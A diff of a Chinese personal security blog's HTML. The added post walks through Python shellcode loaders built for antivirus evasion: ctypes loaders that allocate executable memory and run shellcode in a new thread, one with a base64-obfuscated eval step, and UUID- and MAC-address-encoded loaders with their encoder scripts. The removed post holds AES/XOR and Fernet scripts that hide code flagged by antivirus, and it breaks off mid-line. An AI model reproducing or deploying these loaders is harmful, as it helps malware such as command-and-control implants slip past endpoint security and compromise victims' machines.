@@ -255,6 +255,111 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/10/12/python-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/10/12/python-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">python-shellcode加载器分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-10-12 11:43:38" itemprop="dateCreated datePublished" datetime="2022-10-12T11:43:38+08:00">2022-10-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-19 15:45:11" itemprop="dateModified" datetime="2022-12-19T15:45:11+08:00">2022-12-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/miansha/" itemprop="url" rel="index"><span itemprop="name">-miansha</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="python-shellcode加载器分析"><a href="#python-shellcode加载器分析" class="headerlink" title="python-shellcode加载器分析"></a>python-shellcode加载器分析</h1><p>因为最近在学习免杀，所以写个小文来分析一下py的shellcode加载器</p>
+<p>shellcode：一段可以由电脑直接执行的机器码，执行后可以搭建起stranger。<br>加载器：将shellcode加载进内存，并开始执行的程序。</p>
+<h1 id="加载器1-普通型（失败"><a href="#加载器1-普通型（失败" class="headerlink" title="加载器1-普通型（失败"></a>加载器1-普通型（失败</h1><p>这个加载器就是要报内存地址的错误，本人学艺不精，暂时还无法解决，但我看和市面上的代码一样，所以还是拖过来做一个分析，至少可以了解其中的一些原理，估计是里面的类型的一些问题。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#导入了几个库</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span>   <span class="comment"># b&#x27; &#x27; 表示这是一个 bytes 对象</span></span><br><span class="line">shellcode=<span class="built_in">bytearray</span>(shellcode) <span class="comment">#bytearray() 方法返回一个新字节数组。</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64  <span class="comment">#设置VirtualAlloc返回类型为ctypes.c_uint64。64位操作系统返回的地址需要是该类型。</span></span><br><span class="line"><span class="comment">#VirtualAlloc是Windows提供的API，通常用来分配大块的内存</span></span><br><span class="line"></span><br><span class="line">ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)),ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment">#申请了一个内存地址，lpAddress 是指定内存开始的地址。dwSize 是分配内存的大小。flAllocationType 是分配内存的类型。flProtect 是访问这块分配内存的权限。这多半就是其中四个参数的含义。ctypes.c_int(x)是指将x转为C语言中的int类型</span></span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode) <span class="comment">#定义了一个缓冲区数组，把shellcode写进去了  将shellcode指向指针</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==&#x27;</span></span><br><span class="line"><span class="built_in">eval</span>(base64.b64decode(s))</span><br><span class="line"><span class="comment">#这一段是</span></span><br><span class="line"><span class="comment">#ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))</span></span><br><span class="line"><span class="comment">#从指定内存中复制内存至另一内存里.简称:复制内存.Destination ：指向移动目的地址的指针。Source ：指向要复制的内存地址的指针。Length ：指定要复制的字节数。也就是把缓冲区的shellcode写入申请好的内存地址</span></span><br><span class="line"></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="comment">#要创建在另一个进程的虚拟地址空间中运行的线程，因为shellcode从零开始运行的，所以这里也从零开始，大概是第一个参数把。</span></span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.c_int(ptr),</span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">	)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#正常的话我们创建的线程是需要一直运行的，所以将时间设为负数，等待时间将成为无限等待，程序就不会结束</span></span><br></pre></td></tr></table></figure>
+
+<p>在我将返回类型改成c_void_p以及一个指针改成c_void_p的时候，就不报错了，但是依然上不了线，留着明天来进行分析了</p>
+<h1 id="加载器2-普通型（成功"><a href="#加载器2-普通型（成功" class="headerlink" title="加载器2-普通型（成功"></a>加载器2-普通型（成功</h1><p>主要是利用ctypes库来调用windows的api来完成加载shellcode的操作</p>
+<p>用的y4tacker师傅的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#这前三个函数上面讲过了，我就简单写一下就好了</span></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc<span class="comment">#分配内存</span></span><br><span class="line">RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory<span class="comment">#将shellcode写入内存</span></span><br><span class="line">CreateThread = ctypes.windll.kernel32.CreateThread<span class="comment">#创建线程</span></span><br><span class="line">WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject  <span class="comment">#等待线程结束调用WaitForSingleObject函数用来检测线程的状态WaitForSingleObject函数原型和参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#DWORD WINAPI WaitForSingleObject(</span></span><br><span class="line"><span class="comment">#__in HANDLE hHandle,     #对象句柄。可以指定一系列的对象</span></span><br><span class="line"><span class="comment">#__in DWORD dwMilliseconds  #定时时间间隔</span></span><br><span class="line"><span class="comment">#);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#我的shellcode用的cs生成的</span></span><br><span class="line"><span class="comment"># length: 893 bytes</span></span><br><span class="line">buf = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line">VirtualAlloc.restype = ctypes.c_void_p  <span class="comment"># 重载函数返回类型为void</span></span><br><span class="line">p = VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x3000</span>, <span class="number">0x00000040</span>)  <span class="comment"># 申请内存</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)  <span class="comment"># 将shellcode指向指针</span></span><br><span class="line">RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))  <span class="comment"># 复制shellcode进申请的内存中</span></span><br><span class="line">h = CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_void_p(p), ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))  <span class="comment"># 执行创建线程</span></span><br><span class="line">WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-<span class="number">1</span>))  <span class="comment"># 检测线程创建事件</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="加载器3-UUID写入内存（成功"><a href="#加载器3-UUID写入内存（成功" class="headerlink" title="加载器3-UUID写入内存（成功"></a>加载器3-UUID写入内存（成功</h1><p>注意，这里的环境要使用py2</p>
+<p>发现了去年有大佬写的一篇文章，随后拖过来进行分析</p>
+<p>UUID: 通用唯一标识符 ( Universally Unique Identifier ), 对于所有的UUID它可以保证在空间和时间上的唯一性. 它是通过MAC地址, 时间戳, 命名空间, 随机数, 伪随机数来保证生成ID的唯一性, 有着固定的大小( 128 bit ). 它的唯一性和一致性特点使得可以无需注册过程就能够产生一个新的UUID. UUID可以被用作多种用途, 既可以用来短时间内标记一个对象, 也可以可靠的辨别网络中的持久性对象.</p>
+<p>python有根据十六进制字符串生成UUID的函数uuid.UUID()</p>
+<p>其中值得注意的是，16个字节转换一个uid值，\x00是一个字节，当不满16个的时候，可以添加\x00补充字数。（我生成的补充三个就可以，倍数是56）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">scode = <span class="string">b&#x27;&#x27;&#x27;aaaaaa&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(scode)/<span class="number">16</span>)):</span><br><span class="line">     bytes_a = scode[i*<span class="number">16</span>:<span class="number">16</span>+i*<span class="number">16</span>]</span><br><span class="line">     b = uuid.UUID(bytes_le=bytes_a)</span><br><span class="line">     <span class="built_in">list</span>.append(<span class="built_in">str</span>(b))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面是一个将shellcode转为uuid的小脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid_list = []<span class="comment">#将shellcode转为uuid</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">16</span>):</span><br><span class="line">    cut_bytes = shellcode[i:i+<span class="number">16</span>]</span><br><span class="line">    uid = uuid.UUID(bytes_le=cut_bytes)</span><br><span class="line">    uuid_list.append(<span class="built_in">str</span>(uid))</span><br><span class="line"><span class="built_in">print</span>(uuid_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 <span class="comment">#定义返回类型</span></span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(uuid_list)*<span class="number">16</span>), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))  <span class="comment">#申请内存，这里的内存必须是列表的十六倍</span></span><br><span class="line"></span><br><span class="line">ptr1 = ptr  <span class="comment">#定义了一个内存指针，指向写入的内存地点</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> uuid_list:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(j, ptr1)</span><br><span class="line">    ptr1 += <span class="number">16</span>  <span class="comment">#这里每写入一个uuid就控制指针移动16位，方便下次写入</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="comment">#创建线程然后运行</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="加载器4-MAC写入内存"><a href="#加载器4-MAC写入内存" class="headerlink" title="加载器4-MAC写入内存"></a>加载器4-MAC写入内存</h1><p>注意，这个我也用的是python2的环境</p>
+<p>看到刚刚的大佬，下面有个推荐文章mac写入内存，也顺便弄过来研究一下。</p>
+<p>MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的EPROM一种闪存芯片，通常可以通过程序擦写。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位（6个字节）的 。</p>
+<p><code>RtlEthernetAddressToStringA</code></p>
+<p>该函数是<code>ntdll.dll库</code>的函数，可以把mac地址二进制格式转换为字符串表示。就两个参数，一个是二进制的mac地址，一个是缓冲区的指针，在该缓冲区中存储以NULL结尾的以太网地址字符串表示。此缓冲区应足够大以容纳至少18个字符串。</p>
+<p>下面是一个加密脚本，将shellcode加密成mac地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8...&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = buf</span><br><span class="line">macmem = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,<span class="built_in">len</span>(shellcode)/<span class="number">6</span>*<span class="number">17</span>,<span class="number">0x3000</span>,<span class="number">0x40</span>)<span class="comment">#由于我们转换成mac后，6个字节变成了17个字节，所以需内存大小自己算一下</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)/<span class="number">6</span>):<span class="comment">#然后每隔六个字节进行一次转换，此时内存地址递增17</span></span><br><span class="line">     bytes_a = shellcode[i*<span class="number">6</span>:<span class="number">6</span>+i*<span class="number">6</span>]</span><br><span class="line">     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">a = ctypes.string_at(macmem, <span class="built_in">len</span>(shellcode) * <span class="number">3</span> - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)/<span class="number">6</span>):<span class="comment">#将mac地址字符串转换成列表</span></span><br><span class="line">    d = ctypes.string_at(macmem+i*<span class="number">17</span>,<span class="number">17</span>)</span><br><span class="line">    <span class="built_in">list</span>.append(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里是加载器，加载好mac地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">list</span>)*<span class="number">6</span>,<span class="number">0x3000</span>,<span class="number">0x04</span>) <span class="comment">#申请内存</span></span><br><span class="line"></span><br><span class="line">rwxpage = ptr <span class="comment">#指正</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(<span class="built_in">list</span>[i], <span class="built_in">list</span>[i], rwxpage)<span class="comment">#通过RtlEthernetStringToAddressA函数，将mac值转为二进制写入内存</span></span><br><span class="line">    rwxpage += <span class="number">6</span><span class="comment">#控制指正移位</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr, <span class="built_in">len</span>(<span class="built_in">list</span>)*<span class="number">6</span>, <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))<span class="comment">#创建线程然后混淆就可以了</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>目前就找到这么多，如果后续有还会更新的。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/10/09/CHM%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -417,93 +522,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/10/07/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-python%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%BC%9D%E5%90%88/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/10/07/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-python%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%BC%9D%E5%90%88/" class="post-title-link" itemprop="url">免杀学习-python代码分析缝合</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-10-07 19:13:53" itemprop="dateCreated datePublished" datetime="2022-10-07T19:13:53+08:00">2022-10-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-12 14:44:32" itemprop="dateModified" datetime="2022-11-12T14:44:32+08:00">2022-11-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/miansha/" itemprop="url" rel="index"><span itemprop="name">-miansha</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="免杀学习-python代码分析缝合"><a href="#免杀学习-python代码分析缝合" class="headerlink" title="免杀学习-python代码分析缝合"></a>免杀学习-python代码分析缝合</h1><p>分析下市面上的两个个工具，站在巨人的肩膀上</p>
-<p>这是一个加密的脚本，可以将对应的数据XOR加密和AES加密，用于加密shellcode（bese64编码后的bin文件）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(s) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            s += <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>.encode(s)  <span class="comment"># 返回bytes</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_jiami</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="comment"># 密钥长度必须为16、24或32位，分别对应AES-128、AES-192和AES-256</span></span><br><span class="line">    key = <span class="string">&#x27;LeslieCheungKwok&#x27;</span></span><br><span class="line">    aes = AES.new(add_to_16(key), AES.MODE_ECB)</span><br><span class="line">    encrypted_text = <span class="built_in">str</span>(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding=<span class="string">&#x27;utf8&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_jiami</span>(<span class="params">s,key</span>):</span></span><br><span class="line">    xor_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        xor_s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ key)</span><br><span class="line">    <span class="keyword">return</span> xor_s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sc = <span class="string">&#x27;shellcode&#x27;</span><span class="comment">#读取shellcode</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./aes-xor.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(aes_jiami(xor_jiami(sc,<span class="number">35</span>)))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用fernet加密代码的脚本</span></span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="comment">#被火绒ban掉的代码</span></span><br><span class="line">ban_code=[<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xxxxxxxxx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">           ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> ban_code:</span><br><span class="line">   key =Fernet.generate_key()</span><br><span class="line">   f =Fernet(key)</span><br><span class="line">   enc_pay =f.encrypt(<span class="built_in">bytes</span>(code))</span><br><span class="line">   output_key =<span class="string">&quot;key= &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(key)</span><br><span class="line">   <span class="built_in">print</span>(output_key)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;f_obj= Fernet(key)&quot;</span>)</span><br><span class="line">   output_enc_pay =<span class="string">&quot;enc_pay= &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(enc_pay)</span><br><span class="line">   <span class="built_in">print</span>(output_enc_pay)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;exec(f_obj.decrypt(enc_pay))&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;========================================&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://pyob.oxyry.com/">Oxyry Python Obfuscator - The most reliable python obfuscator in the world</a></p>
-<p>python代码混淆网址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加载器</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">kernel32 = ctypes.windll.kernel32</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_jiemi</span>(<span class="params">s</span>):</span></span><br><span class="line">    cipher = AES.new(<span class="string">b&#x27;LeslieCheungKwok&#x27;</span>, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(base64.decodebytes(<span class="built_in">bytes</span>(s, encoding=<span 